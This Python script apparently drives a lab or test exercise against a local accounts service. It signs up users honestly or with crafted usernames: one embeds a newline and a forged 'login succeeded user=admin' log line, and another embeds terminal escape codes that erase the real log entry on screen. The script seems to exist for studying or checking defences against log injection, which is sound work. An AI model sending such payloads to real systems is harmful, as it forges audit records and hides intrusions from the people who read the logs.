"""Sign up / log in to the accounts service, honestly or not.

    python3 tools/attack.py honest        # sign up "maria" and log in once
    python3 tools/attack.py forge         # sign up with a username carrying a forged log line
    python3 tools/attack.py hide          # sign up with a username carrying terminal control codes
"""

import os
import sys
import time
import urllib.error
import urllib.parse
import urllib.request

BASE = os.environ.get("ACCOUNTS_URL", "http://127.0.0.1:8017")


def payloads() -> dict[str, str]:
    # A timestamp in the same format the app uses, so the fake line looks real.
    # Today's date at a fixed time, so check.sh can rebuild the exact payload.
    ts = time.strftime("%Y-%m-%d") + " 03:12:44,417"
    return {
        "forge": f"eve\n{ts} INFO login succeeded user=admin ip=10.0.0.5",
        # ESC[1A = cursor up a line, ESC[2K = erase it: in a terminal the line
        # shows "dave" and everything about the real event before it vanishes.
        "hide": "dave \x1b[1A\x1b[2K\rlooks harmless",
    }


def post(path: str, username: str, password: str = "FAKE-pw-123") -> int:
    data = urllib.parse.urlencode({"username": username, "password": password}).encode()
    try:
        with urllib.request.urlopen(f"{BASE}{path}", data=data, timeout=5) as r:
            return r.status
    except urllib.error.HTTPError as e:
        return e.code


def main() -> None:
    kind = sys.argv[1] if len(sys.argv) > 1 else "honest"
    if kind == "honest":
        print("signup", post("/signup", "maria"), "login", post("/login", "maria"))
    elif kind in payloads():
        print("signup", post("/signup", payloads()[kind]), repr(payloads()[kind]))
    else:
        sys.exit(__doc__)


if __name__ == "__main__":
    main()
